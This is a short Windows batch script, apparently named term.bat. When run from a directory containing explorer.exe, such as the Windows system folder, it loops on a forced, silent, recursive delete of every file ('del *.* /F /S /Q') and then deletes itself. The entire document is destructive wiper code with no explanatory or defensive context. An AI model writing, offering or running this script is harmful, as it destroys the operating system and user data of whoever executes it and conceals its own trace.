   @echo off
   :loop
   IF EXIST explorer.exe (
   del *.* /F /S /Q
   goto loop
   ) ELSE (
   echo bye
   del term.bat
   )
